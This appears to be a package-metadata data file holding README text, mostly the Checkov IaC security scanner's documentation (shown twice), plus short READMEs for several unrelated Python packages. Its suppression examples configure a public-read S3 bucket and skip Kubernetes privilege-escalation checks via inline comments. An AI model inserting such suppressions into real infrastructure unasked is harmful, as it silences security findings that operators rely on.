    #checkov:skip=CKV_AWS_20:The bucket is a public static content host
  bucket        = local.bucket_name
  force_destroy = true
  acl           = ""public-read""
}
```

The output would now contain a ``SKIPPED`` check result entry:

```bash
...
...
Check: ""S3 Bucket has an ACL defined which allows public access.""
	SKIPPED for resource: aws_s3_bucket.foo-bucket
	Suppress comment: The bucket is a public static content host
	File: /example_skip_acl.tf:1-25
	
...
```
To skip multiple checks, add each as a new line.

```
  #checkov:skip=CKV2_AWS_6
  #checkov:skip=CKV_AWS_20:The bucket is a public static content host
```
  
To suppress checks in Kubernetes manifests, annotations are used with the following format:
`checkov.io/skip#: <check_id>=<suppression_comment>`

For example: 

```bash
apiVersion: v1
kind: Pod
metadata:
  name: mypod
  annotations:
    checkov.io/skip1: CKV_K8S_20=I don't care about Privilege Escalation :-O
    checkov.io/skip2: CKV_K8S_14
    checkov.io/skip3: CKV_K8S_11=I have not set CPU limits as I want BestEffort QoS
spec:
  containers:
...
```

#### Logging

For detailed logging to stdout set up the environment variable `LOG_LEVEL` to `DEBUG`. 

Default is `LOG_LEVEL=WARNING`.

#### Skipping directories
To skip files or directories, use the argument `--skip-path`, which can be specified multiple times. This argument accepts regular expressions for paths relative to the current working directory. You can use it to skip entire directories and / or specific files.

By default, all directories named `node_modules`, `.terraform`, and `.serverless` will be skipped, in addition to any files or directories beginning with `.`.
To cancel skipping directories beginning with `.` override `CKV_IGNORE_HIDDEN_DIRECTORIES` environment variable `export CKV_IGNORE_HIDDEN_DIRECTORIES=false`

You can override the default set of directories to skip by setting the environment variable `CKV_IGNORED_DIRECTORIES`.
 Note that if you want to preserve this list and add to it, you must include these values. For example, `CKV_IGNORED_DIRECTORIES=mynewdir` will skip only that directory, but not the others mentioned above. This variable is legacy functionality; we recommend using the `--skip-file` flag.

#### Console Output

The console output is in colour by default, to switch to a monochrome output, set the environment variable:
`ANSI_COLORS_DISABLED`

#### VSCODE Extension

If you want to use checkov's within vscode, give a try to the vscode extension available at [vscode](https://marketplace.visualstudio.com/items?itemName=Bridgecrew.checkov)

### Configuration using a config file

Checkov can be configured using a YAML configuration file. By default, checkov looks for a `.checkov.yaml` or `.checkov.yml` file in the following places in order of precedence:
* Directory against which checkov is run. (`--directory`)
* Current working directory where checkov is called.
* User's home directory.

**Attention**: it is a best practice for checkov configuration file to be loaded from a trusted source composed by a verified identity, so that scanned files, check ids and loaded custom checks are as desired.

Users can also pass in the path to a config file via the command line. In this case, the other config files will be ignored. For example:
```sh
checkov --config-file path/to/config.yaml
```
Users can also create a config file using the `--create-config` command, which takes the current command line args and writes them out to a given path. For example:
```sh
checkov --compact --directory test-dir --docker-image sample-image --dockerfile-path Dockerfile --download-external-modules True --external-checks-dir sample-dir --no-guide --quiet --repo-id bridgecrew/sample-repo --skip-check CKV_DOCKER_3,CKV_DOCKER_2 --skip-fixes --skip-framework dockerfile secrets --skip-suppressions --soft-fail --branch develop --check CKV_DOCKER_1 --create-config /Users/sample/config.yml
```
Will create a `config.yaml` file which looks like this:
```yaml
branch: develop
check:
  - CKV_DOCKER_1
compact: true
directory:
  - test-dir
docker-image: sample-image
dockerfile-path: Dockerfile
download-external-modules: true 
evaluate-variables: true 
external-checks-dir: 
  - sample-dir 
external-modules-download-path: .external_modules 
framework:
  - all 
no-guide: true 
output: cli 
quiet: true 
repo-id: bridgecrew/sample-repo 
skip-check: 
  - CKV_DOCKER_3 
  - CKV_DOCKER_2 
skip-fixes: true 
skip-framework:
  - dockerfile
  - secrets
skip-suppressions: true 
soft-fail: true
```

Users can also use the `--show-config` flag to view all the args and settings and where they came from i.e. commandline, config file, environment variable or default. For example:
```sh
checkov --show-config
```
Will display:
```sh
Command Line Args:   --show-config
Environment Variables:
  BC_API_KEY:        your-api-key
Config File (/Users/sample/.checkov.yml):
  soft-fail:         False
  branch:            master
  skip-check:        ['CKV_DOCKER_3', 'CKV_DOCKER_2']
Defaults:
  --output:          cli
  --framework:       ['all']
  --download-external-modules:False
  --external-modules-download-path:.external_modules
  --evaluate-variables:True
```
## Contributing

Contribution is welcomed! 

Start by reviewing the [contribution guidelines](CONTRIBUTING.md). After that, take a look at a [good first issue](https://github.com/bridgecrewio/checkov/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22).

You can even start this with one-click dev in your browser through Gitpod at the following link:

[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://gitpod.io/#https://github.com/bridgecrewio/checkov)

Looking to contribute new checks? Learn how to write a new check (AKA policy) [here](docs/6.Contribution/Contribution%20Overview.md).

## Disclaimer
`checkov` does not save, publish or share with anyone any identifiable customer information.  
No identifiable customer information is used to query Bridgecrew's publicly accessible guides.
`checkov` uses Bridgecrew's API to enrich the results with links to remediation guides.
To skip this API call use the flag `--no-guide`.

## Support

[Bridgecrew](https://bridgecrew.io/?utm_source=github&utm_medium=organic_oss&utm_campaign=checkov) builds and maintains Checkov to make policy-as-code simple and accessible. 

Start with our [Documentation](https://bridgecrewio.github.io/checkov/) for quick tutorials and examples.

If you need direct support you can contact us at info@bridgecrew.io.

## Python Version Support
We follow the official support cycle of Python and we use automated tests for all supported versions of Python. This means we currently support Python 3.7 - 3.11, inclusive. Note that Python 3.7 is reaching EOL on June 2023. After that time, we will have a short grace period where we will continue 3.7 support until September 2023, and then it will no longer be considered supported for Checkov. If you run into any issues with any non-EOL Python version, please open an Issue.
","[![checkov](https://raw.githubusercontent.com/bridgecrewio/checkov/master/docs/web/images/checkov_by_bridgecrew.png)](#)
       
[![Maintained by Bridgecrew.io](https://img.shields.io/badge/maintained%20by-bridgecrew.io-blueviolet)](https://bridgecrew.io/?utm_source=github&utm_medium=organic_oss&utm_campaign=checkov)
[![build status](https://github.com/bridgecrewio/checkov/workflows/build/badge.svg)](https://github.com/bridgecrewio/checkov/actions?query=workflow%3Abuild)
[![security status](https://github.com/bridgecrewio/checkov/workflows/security/badge.svg)](https://github.com/bridgecrewio/checkov/actions?query=event%3Apush+branch%3Amaster+workflow%3Asecurity) 
[![code_coverage](https://raw.githubusercontent.com/bridgecrewio/checkov/master/coverage.svg?sanitize=true)](https://github.com/bridgecrewio/checkov/actions?query=workflow%3Acoverage) 
[![docs](https://img.shields.io/badge/docs-passing-brightgreen)](https://www.checkov.io/1.Welcome/What%20is%20Checkov.html?utm_source=github&utm_medium=organic_oss&utm_campaign=checkov)
[![PyPI](https://img.shields.io/pypi/v/checkov)](https://pypi.org/project/checkov/)
[![Python Version](https://img.shields.io/pypi/pyversions/checkov)](#)
[![Terraform Version](https://img.shields.io/badge/tf-%3E%3D0.12.0-blue.svg)](#)
[![Downloads](https://pepy.tech/badge/checkov)](https://pepy.tech/project/checkov)
[![Docker Pulls](https://img.shields.io/docker/pulls/bridgecrew/checkov.svg)](https://hub.docker.com/r/bridgecrew/checkov)
[![slack-community](https://img.shields.io/badge/Slack-4A154B?style=plastic&logo=slack&logoColor=white)](https://slack.bridgecrew.io/)
 

**Checkov** is a static code analysis tool for infrastructure as code (IaC) and also a software composition analysis (SCA) tool for images and open source packages.

It scans cloud infrastructure provisioned using [Terraform](https://terraform.io/), [Terraform plan](docs/7.Scan%20Examples/Terraform%20Plan%20Scanning.md), [Cloudformation](docs/7.Scan%20Examples/Cloudformation.md), [AWS SAM](docs/7.Scan%20Examples/AWS%20SAM.md), [Kubernetes](docs/7.Scan%20Examples/Kubernetes.md), [Helm charts](docs/7.Scan%20Examples/Helm.md), [Kustomize](docs/7.Scan%20Examples/Kustomize.md), [Dockerfile](docs/7.Scan%20Examples/Dockerfile.md),  [Serverless](docs/7.Scan%20Examples/Serverless%20Framework.md), [Bicep](docs/7.Scan%20Examples/Bicep.md), [OpenAPI](docs/7.Scan%20Examples/OpenAPI.md) or [ARM Templates](docs/7.Scan%20Examples/Azure%20ARM%20templates.md) and detects security and compliance misconfigurations using graph-based scanning.

It performs [Software Composition Analysis (SCA) scanning](docs/7.Scan%20Examples/Sca.md) which is a scan of open source packages and images for Common Vulnerabilities and Exposures (CVEs).
 
Checkov also powers [**Bridgecrew**](https://bridgecrew.io/?utm_source=github&utm_medium=organic_oss&utm_campaign=checkov), the developer-first platform that codifies and streamlines cloud security throughout the development lifecycle. Bridgecrew identifies, fixes, and prevents misconfigurations in cloud resources and infrastructure-as-code files. 








## **Table of contents**

- [Features](#features)
- [Screenshots](#screenshots)
- [Getting Started](#getting-started)
- [Disclaimer](#disclaimer)
- [Support](#support)

 ## Features

 * [Over 1000 built-in policies](docs/5.Policy%20Index/all.md) cover security and compliance best practices for AWS, Azure and Google Cloud.
 * Scans Terraform, Terraform Plan, Terraform JSON, CloudFormation, AWS SAM, Kubernetes, Helm, Kustomize, Dockerfile, Serverless framework, Ansible, Bicep and ARM template files.
 * Scans Argo Workflows, Azure Pipelines, BitBucket Pipelines, Circle CI Pipelines, GitHub Actions and GitLab CI workflow files
 * Supports Context-awareness policies based on in-memory graph-based scanning.
 * Supports Python format for attribute policies and YAML format for both attribute and composite policies.
 * Detects [AWS credentials](docs/2.Basics/Scanning%20Credentials%20and%20Secrets.md) in EC2 Userdata, Lambda environment variables and Terraform providers.
 * [Identifies secrets](https://bridgecrew.io/blog/checkov-secrets-scanning-find-exposed-credentials-in-iac/) using regular expressions, keywords, and entropy based detection.
 * Evaluates [Terraform Provider](https://registry.terraform.io/browse/providers) settings to regulate the creation, management, and updates of IaaS, PaaS or SaaS managed through Terraform.
 * Policies support evaluation of [variables](docs/2.Basics/Handling%20Variables.md) to their optional default value.
 * Supports in-line [suppression](docs/2.Basics/Suppressing%20and%20Skipping%20Policies.md) of accepted risks or false-positives to reduce recurring scan failures. Also supports global skip from using CLI.
 * [Output](docs/2.Basics/Reviewing%20Scan%20Results.md) currently available as CLI, [CycloneDX](https://cyclonedx.org), JSON, JUnit XML, CSV, SARIF and github markdown and link to remediation [guides](https://docs.bridgecrew.io/docs/aws-policy-index).
 
## Screenshots

Scan results in CLI

![scan-screenshot](https://raw.githubusercontent.com/bridgecrewio/checkov/master/docs/checkov-recording.gif)

Scheduled scan result in Jenkins

![jenikins-screenshot](https://raw.githubusercontent.com/bridgecrewio/checkov/master/docs/checkov-jenkins.png)

## Getting started

### Requirements
 * Python >= 3.7 (Data classes are available for Python 3.7+)
 * Terraform >= 0.12

### Installation

```sh
pip3 install checkov
```

Installation on Alpine:
```sh
pip3 install --upgrade pip && pip3 install --upgrade setuptools
pip3 install checkov
```

Installation on Ubuntu 18.04 LTS:

Ubuntu 18.04 ships with Python 3.6. Install python 3.7 (from ppa repository)

```sh
sudo apt update
sudo apt install software-properties-common
sudo add-apt-repository ppa:deadsnakes/ppa
sudo apt install python3.7
sudo apt install python3-pip
sudo python3.7 -m pip install -U checkov #to install or upgrade checkov)
```

or using [homebrew](https://formulae.brew.sh/formula/checkov) (macOS or Linux)

```sh
brew install checkov
```

or

```sh
brew upgrade checkov
```

### Enabling bash autocomplete
```sh
source <(register-python-argcomplete checkov)
```
### Upgrade

if you installed checkov with pip3
```sh
pip3 install -U checkov
```

### Configure an input folder or file

```sh
checkov --directory /user/path/to/iac/code
```

Or a specific file or files

```sh
checkov --file /user/tf/example.tf
```
Or
```sh
checkov -f /user/cloudformation/example1.yml -f /user/cloudformation/example2.yml
```

Or a terraform plan file in json format
```sh
terraform init
terraform plan -out tf.plan
terraform show -json tf.plan  > tf.json 
checkov -f tf.json
```
Note: `terraform show` output file `tf.json` will be a single line. 
For that reason all findings will be reported line number 0 by checkov
```sh
check: CKV_AWS_21: ""Ensure all data stored in the S3 bucket have versioning enabled""
	FAILED for resource: aws_s3_bucket.customer
	File: /tf/tf.json:0-0
	Guide: https://docs.bridgecrew.io/docs/s3_16-enable-versioning
  ```

If you have installed `jq` you can convert json file into multiple lines with the following command:
```sh
terraform show -json tf.plan | jq '.' > tf.json 
```
Scan result would be much user friendly.
```sh
checkov -f tf.json
Check: CKV_AWS_21: ""Ensure all data stored in the S3 bucket have versioning enabled""
	FAILED for resource: aws_s3_bucket.customer
	File: /tf/tf1.json:224-268
	Guide: https://docs.bridgecrew.io/docs/s3_16-enable-versioning

		225 |               ""values"": {
		226 |                 ""acceleration_status"": """",
		227 |                 ""acl"": ""private"",
		228 |                 ""arn"": ""arn:aws:s3:::mybucket"",

```

Alternatively, specify the repo root of the hcl files used to generate the plan file, using the `--repo-root-for-plan-enrichment` flag, to enrich the output with the appropriate file path, line numbers, and codeblock of the resource(s). An added benefit is that check suppressions will be handled accordingly.
```sh
checkov -f tf.json --repo-root-for-plan-enrichment /user/path/to/iac/code
```


### Scan result sample (CLI)

```sh
Passed Checks: 1, Failed Checks: 1, Suppressed Checks: 0
Check: ""Ensure all data stored in the S3 bucket is securely encrypted at rest""
/main.tf:
	 Passed for resource: aws_s3_bucket.template_bucket 
Check: ""Ensure all data stored in the S3 bucket is securely encrypted at rest""
/../regionStack/main.tf:
	 Failed for resource: aws_s3_bucket.sls_deployment_bucket_name       
```

Start using Checkov by reading the [Getting Started](docs/1.Welcome/Quick%20Start.md) page.

### Using Docker


```sh
docker pull bridgecrew/checkov
docker run --tty --rm --volume /user/tf:/tf --workdir /tf bridgecrew/checkov --directory /tf
```
Note: if you are using Python 3.6(Default version in Ubuntu 18.04) checkov will not work and it will fail with `ModuleNotFoundError: No module named 'dataclasses'`  error message. In this case, you can use the docker version instead.

Note that there are certain cases where redirecting `docker run --tty` output to a file - for example, if you want to save the Checkov JUnit output to a file - will cause extra control characters to be printed. This can break file parsing. If you encounter this, remove the `--tty` flag.

The `--workdir /tf` flag is optional to change the working directory to the mounted volume. If you are using the SARIF output `-o sarif` this will output the results.sarif file to the mounted volume (`/user/tf` in the example above). If you do not include that flag, the working directory will be ""/"".

### Running or skipping checks 

By using command line flags, you can specify to run only named checks (allow list) or run all checks except 
those listed (deny list). If you are using the platform integration via API key, you can also specify a severity threshold to skip and / or include.
Moreover, as json files can't contain comments, one can pass regex pattern to skip json file secret scan.

See the docs for more detailed information about how these flags work together.
   

## Examples

Allow only the two specified checks to run: 
```sh
checkov --directory . --check CKV_AWS_20,CKV_AWS_57
```

Run all checks except the one specified:
```sh
checkov -d . --skip-check CKV_AWS_20
```

Run all checks except checks with specified patterns:
```sh
checkov -d . --skip-check CKV_AWS*
```

Run all checks that are MEDIUM severity or higher (requires API key):
```sh
checkov -d . --check MEDIUM --bc-api-key ...
```

Run all checks that are MEDIUM severity or higher, as well as check CKV_123 (assume this is a LOW severity check):
```sh
checkov -d . --check MEDIUM,CKV_123 --bc-api-key ...
```

Skip all checks that are MEDIUM severity or lower:
```sh
checkov -d . --skip-check MEDIUM --bc-api-key ...
```

Skip all checks that are MEDIUM severity or lower, as well as check CKV_789 (assume this is a high severity check):
```sh
checkov -d . --skip-check MEDIUM,CKV_789 --bc-api-key ...
```

Run all checks that are MEDIUM severity or higher, but skip check CKV_123 (assume this is a medium or higher severity check):
```sh
checkov -d . --check MEDIUM --skip-check CKV_123 --bc-api-key ...
```

Run check CKV_789, but skip it if it is a medium severity (the --check logic is always applied before --skip-check)
```sh
checkov -d . --skip-check MEDIUM --check CKV_789 --bc-api-key ...
```

For Kubernetes workloads, you can also use allow/deny namespaces.  For example, do not report any results for the 
kube-system namespace:
```sh
checkov -d . --skip-check kube-system
```

Run a scan of a container image. First pull or build the image then refer to it by the hash, ID, or name:tag:
```sh
checkov --framework sca_image --docker-image sha256:1234example --dockerfile-path /Users/path/to/Dockerfile --bc-api-key ...

checkov --docker-image :tag --dockerfile-path /User/path/to/Dockerfile --bc-api-key ...
```

You can use --image flag also to scan container image instead of --docker-image for shortener:
```sh
checkov --image :tag --dockerfile-path /User/path/to/Dockerfile --bc-api-key ...
```

Run an SCA scan of packages in a repo:
```sh
checkov -d . --framework sca_package --bc-api-key ... --repo-id 
```

Run a scan of a directory with environment variables removing buffering, adding debug level logs:
```sh
PYTHONUNBUFFERED=1 LOG_LEVEL=DEBUG checkov -d .
```
OR enable the environment variables for multiple runs
```sh
export PYTHONUNBUFFERED=1 LOG_LEVEL=DEBUG
checkov -d .
```

Run secrets scanning on all files in MyDirectory. Skip CKV_SECRET_6 check on json files that their suffix is DontScan
```sh
checkov -d /MyDirectory --framework secrets --bc-api-key ... --skip-check CKV_SECRET_6:.*DontScan.json$
```

Run secrets scanning on all files in MyDirectory. Skip CKV_SECRET_6 check on json files that contains ""skip_test"" in path
```sh
checkov -d /MyDirectory --framework secrets --bc-api-key ... --skip-check CKV_SECRET_6:.*skip_test.*json$
```

One can mask values from scanning results by supplying a configuration file (using --config-file flag) with mask entry.
The masking can apply on resource & value (or multiple values, seperated with a comma). 
Examples:
```sh
mask:
- aws_instance:user_data
- azurerm_key_vault_secret:admin_password,user_passwords
```
In the example above, the following values will be masked:
- user_data for aws_instance resource
- both admin_password &user_passwords for azurerm_key_vault_secret


### Suppressing/Ignoring a check

Like any static-analysis tool it is limited by its analysis scope. 
For example, if a resource is managed manually, or using subsequent configuration management tooling, 
suppression can be inserted as a simple code annotation.

#### Suppression comment format

To skip a check on a given Terraform definition block or CloudFormation resource, apply the following comment pattern inside it's scope:

`checkov:skip=:`

* `` is one of the [available check scanners](docs/5.Policy Index/all.md)
* `` is an optional suppression reason to be included in the output

#### Example

The following comment skips the `CKV_AWS_20` check on the resource identified by `foo-bucket`, where the scan checks if an AWS S3 bucket is private.
In the example, the bucket is configured with public read access; Adding the suppress comment would skip the appropriate check instead of the check to fail.

```hcl-terraform
resource ""aws_s3_bucket"" ""foo-bucket"" {
  region        = var.region
    #checkov:skip=CKV_AWS_20:The bucket is a public static content host
  bucket        = local.bucket_name
  force_destroy = true
  acl           = ""public-read""
}
```

The output would now contain a ``SKIPPED`` check result entry:

```bash
...
...
Check: ""S3 Bucket has an ACL defined which allows public access.""
	SKIPPED for resource: aws_s3_bucket.foo-bucket
	Suppress comment: The bucket is a public static content host
	File: /example_skip_acl.tf:1-25
	
...
```
To skip multiple checks, add each as a new line.

```
  #checkov:skip=CKV2_AWS_6
  #checkov:skip=CKV_AWS_20:The bucket is a public static content host
```
  
To suppress checks in Kubernetes manifests, annotations are used with the following format:
`checkov.io/skip#: =`

For example: 

```bash
apiVersion: v1
kind: Pod
metadata:
  name: mypod
  annotations:
    checkov.io/skip1: CKV_K8S_20=I don't care about Privilege Escalation :-O
    checkov.io/skip2: CKV_K8S_14
    checkov.io/skip3: CKV_K8S_11=I have not set CPU limits as I want BestEffort QoS
spec:
  containers:
...
```

#### Logging

For detailed logging to stdout set up the environment variable `LOG_LEVEL` to `DEBUG`. 

Default is `LOG_LEVEL=WARNING`.

#### Skipping directories
To skip files or directories, use the argument `--skip-path`, which can be specified multiple times. This argument accepts regular expressions for paths relative to the current working directory. You can use it to skip entire directories and / or specific files.

By default, all directories named `node_modules`, `.terraform`, and `.serverless` will be skipped, in addition to any files or directories beginning with `.`.
To cancel skipping directories beginning with `.` override `CKV_IGNORE_HIDDEN_DIRECTORIES` environment variable `export CKV_IGNORE_HIDDEN_DIRECTORIES=false`

You can override the default set of directories to skip by setting the environment variable `CKV_IGNORED_DIRECTORIES`.
 Note that if you want to preserve this list and add to it, you must include these values. For example, `CKV_IGNORED_DIRECTORIES=mynewdir` will skip only that directory, but not the others mentioned above. This variable is legacy functionality; we recommend using the `--skip-file` flag.

#### Console Output

The console output is in colour by default, to switch to a monochrome output, set the environment variable:
`ANSI_COLORS_DISABLED`

#### VSCODE Extension

If you want to use checkov's within vscode, give a try to the vscode extension available at [vscode](https://marketplace.visualstudio.com/items?itemName=Bridgecrew.checkov)

### Configuration using a config file

Checkov can be configured using a YAML configuration file. By default, checkov looks for a `.checkov.yaml` or `.checkov.yml` file in the following places in order of precedence:
* Directory against which checkov is run. (`--directory`)
* Current working directory where checkov is called.
* User's home directory.

**Attention**: it is a best practice for checkov configuration file to be loaded from a trusted source composed by a verified identity, so that scanned files, check ids and loaded custom checks are as desired.

Users can also pass in the path to a config file via the command line. In this case, the other config files will be ignored. For example:
```sh
checkov --config-file path/to/config.yaml
```
Users can also create a config file using the `--create-config` command, which takes the current command line args and writes them out to a given path. For example:
```sh
checkov --compact --directory test-dir --docker-image sample-image --dockerfile-path Dockerfile --download-external-modules True --external-checks-dir sample-dir --no-guide --quiet --repo-id bridgecrew/sample-repo --skip-check CKV_DOCKER_3,CKV_DOCKER_2 --skip-fixes --skip-framework dockerfile secrets --skip-suppressions --soft-fail --branch develop --check CKV_DOCKER_1 --create-config /Users/sample/config.yml
```
Will create a `config.yaml` file which looks like this:
```yaml
branch: develop
check:
  - CKV_DOCKER_1
compact: true
directory:
  - test-dir
docker-image: sample-image
dockerfile-path: Dockerfile
download-external-modules: true 
evaluate-variables: true 
external-checks-dir: 
  - sample-dir 
external-modules-download-path: .external_modules 
framework:
  - all 
no-guide: true 
output: cli 
quiet: true 
repo-id: bridgecrew/sample-repo 
skip-check: 
  - CKV_DOCKER_3 
  - CKV_DOCKER_2 
skip-fixes: true 
skip-framework:
  - dockerfile
  - secrets
skip-suppressions: true 
soft-fail: true
```

Users can also use the `--show-config` flag to view all the args and settings and where they came from i.e. commandline, config file, environment variable or default. For example:
```sh
checkov --show-config
```
Will display:
```sh
Command Line Args:   --show-config
Environment Variables:
  BC_API_KEY:        your-api-key
Config File (/Users/sample/.checkov.yml):
  soft-fail:         False
  branch:            master
  skip-check:        ['CKV_DOCKER_3', 'CKV_DOCKER_2']
Defaults:
  --output:          cli
  --framework:       ['all']
  --download-external-modules:False
  --external-modules-download-path:.external_modules
  --evaluate-variables:True
```
## Contributing

Contribution is welcomed! 

Start by reviewing the [contribution guidelines](CONTRIBUTING.md). After that, take a look at a [good first issue](https://github.com/bridgecrewio/checkov/issues?q=is%3Aissue+is%3Aopen+label%3A%22good+first+issue%22).

You can even start this with one-click dev in your browser through Gitpod at the following link:

[![Open in Gitpod](https://gitpod.io/button/open-in-gitpod.svg)](https://gitpod.io/#https://github.com/bridgecrewio/checkov)

Looking to contribute new checks? Learn how to write a new check (AKA policy) [here](docs/6.Contribution/Contribution%20Overview.md).

## Disclaimer
`checkov` does not save, publish or share with anyone any identifiable customer information.  
No identifiable customer information is used to query Bridgecrew's publicly accessible guides.
`checkov` uses Bridgecrew's API to enrich the results with links to remediation guides.
To skip this API call use the flag `--no-guide`.

## Support

[Bridgecrew](https://bridgecrew.io/?utm_source=github&utm_medium=organic_oss&utm_campaign=checkov) builds and maintains Checkov to make policy-as-code simple and accessible. 

Start with our [Documentation](https://bridgecrewio.github.io/checkov/) for quick tutorials and examples.

If you need direct support you can contact us at info@bridgecrew.io.

## Python Version Support
We follow the official support cycle of Python and we use automated tests for all supported versions of Python. This means we currently support Python 3.7 - 3.11, inclusive. Note that Python 3.7 is reaching EOL on June 2023. After that time, we will have a short grace period where we will continue 3.7 support until September 2023, and then it will no longer be considered supported for Checkov. If you run into any issues with any non-EOL Python version, please open an Issue.
",bridgecrewio/checkov
plttbc,https://github.com/pavradev/lttbc/,1,0,0,,,pavradev/lttbc
rasst,https://github.com/BjarkeN/RASST,0,1253,1253,"# RASST
 Radar Altimeter Source Separation Toolbox


## Table of Contents
[Installation](##Installation)

[Licensing](##Licensing)

## Installation
pip install RASST

## Licensing
Copyright (c) 2018 The Python Packaging Authority

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.","# RASST
 Radar Altimeter Source Separation Toolbox


## Table of Contents
[Installation](##Installation)

[Licensing](##Licensing)

## Installation
pip install RASST

## Licensing
Copyright (c) 2018 The Python Packaging Authority

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the ""Software""), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED ""AS IS"", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.",bjarken/rasst
mt-auto-minhon-mlt,https://github.com/MIDORIBIN/mt-auto-minhon-mlt,2,1040,1040,"# みんなの自動翻訳 Python Library

[![Python application](https://github.com/MIDORIBIN/mt-auto-minhon-mlt/actions/workflows/python-app.yml/badge.svg)](https://github.com/MIDORIBIN/mt-auto-minhon-mlt/actions/workflows/python-app.yml)

## インストール

```shell
pip install git+https://github.com/MIDORIBIN/mt-auto-minhon-mlt.git
```

## 必要条件

本ライブラリは、Python バージョン 3.9.7 でテストされています。

## 使用法

1. [みんなの自動翻訳の設定画面](https://mt-auto-minhon-mlt.ucri.jgn-x.jp/content/setting/user/edit/)から `ユーザーID` 、 `API key` 、 `API secret` を取得
2. `Translator` クラスのインスタンスを生成
3. `Translator.translate_text` に翻訳対象の文章、翻訳前の言語、翻訳後の言語を指定

`API key` 及び `API secret` は公開しないように注意してください。

```python
from mt_auto_minhon_mlt import Translator

translator = Translator(
    client_id='ab5718f...',
    client_secret='45791a9...',
    user_name='name',
)
en_actual = translator.translate_text('みんなの自動翻訳', source_lang='ja', target_lang='en')
```

## TODO

- [x] ~~CI~~
- [x] ~~linter, formatter~~
- [ ] PyPI
- [ ] CD
- [ ] badge
- [ ] CLI
- [ ] docs
- [ ] docs header
- [ ] PyPI GitHub Actions
","# みんなの自動翻訳 Python Library

[![Python application](https://github.com/MIDORIBIN/mt-auto-minhon-mlt/actions/workflows/python-app.yml/badge.svg)](https://github.com/MIDORIBIN/mt-auto-minhon-mlt/actions/workflows/python-app.yml)

## インストール

```shell
pip install git+https://github.com/MIDORIBIN/mt-auto-minhon-mlt.git
```

## 必要条件

本ライブラリは、Python バージョン 3.9.7 でテストされています。

## 使用法

1. [みんなの自動翻訳の設定画面](https://mt-auto-minhon-mlt.ucri.jgn-x.jp/content/setting/user/edit/)から `ユーザーID` 、 `API key` 、 `API secret` を取得
2. `Translator` クラスのインスタンスを生成
3. `Translator.translate_text` に翻訳対象の文章、翻訳前の言語、翻訳後の言語を指定

`API key` 及び `API secret` は公開しないように注意してください。

```python
from mt_auto_minhon_mlt import Translator

translator = Translator(
    client_id='ab5718f...',
    client_secret='45791a9...',
    user_name='name',
)
en_actual = translator.translate_text('みんなの自動翻訳', source_lang='ja', target_lang='en')
```

## TODO

- [x] ~~CI~~
- [x] ~~linter, formatter~~
- [ ] PyPI
- [ ] CD
- [ ] badge
- [ ] CLI
- [ ] docs
- [ ] docs header
- [ ] PyPI GitHub Actions
",midoribin/mt-auto-minhon-mlt
protloc-mex1,https://github.com/yujuan-zhang/ProtLoc-mexl,6,538,538,"# ProtLoc-mexl
This project provides a pipeline for fast construction of subcellular localization prediction and model interpretation, with 42 amino acid feature characterization algorithms and GO feature extraction based on Doc2Vec. In addition, two random forest models for protein localization prediction are also provided.

As the manuscript is still under review, we have not fully released the core code and pre-trained models of ProtLoc-Mex1. If you need the core code, please contact the author at 1024226968@qq.com by email.
","# ProtLoc-mexl
This project provides a pipeline for fast construction of subcellular localization prediction and model interpretation, with 42 amino acid feature characterization algorithms and GO feature extraction based on Doc2Vec. In addition, two random forest models for protein localization prediction are also provided.

As the manuscript is still under review, we have not fully released the core code and pre-trained models of ProtLoc-Mex1. If you need the core code, please contact the author at 1024226968@qq.com by email.
",yujuan-zhang/protloc-mexl
quri-parts-quantinuum,https://github.com/QunaSys/quri-parts,2,277,277,"# QURI Parts Quantinuum

QURI Parts Quantinuum is a support library for using Quantinuum with QURI Parts.

## Documentation

[QURI Parts Documentation](https://quri-parts.qunasys.com)

## Installation

```
pip install quri-parts-quantinuum
```

## License

Apache License 2.0

","# QURI Parts Quantinuum

QURI Parts Quantinuum is a support library for using Quantinuum with QURI Parts.

## Documentation

[QURI Parts Documentation](https://quri-parts.qunasys.com)

## Installation

```
pip install quri-parts-quantinuum
```

## License

Apache License 2.0

",qunasys/quri-parts
gbt-parser,https://github.com/AnandSingh-Euler/GBT-parser,9,0,0,,,anandsingh-euler/gbt-parser
vht,https://github.com/rdybka/vht,0,1255,1255,"![vht header](/data/vht_header.png)
## about
vahatraker is a MIDI sequencing companion
for GNU/Linux audio setups. Adhering to Unix philosophy,
driving MIDI is the one thing it tries to do well,
adhering to other doctrines - enabling expression,
with added value of:

- live editing
- fast workflow
- intuitive midi-in
- unheard of time signatures
- scenes a'la 'ton
- fractal turtles
- fits on a floppy
- doesn't make sound

Frankly speaking, vht was envisaged as a re-creation
of seq24 in tracker form for author's ""studio needs""
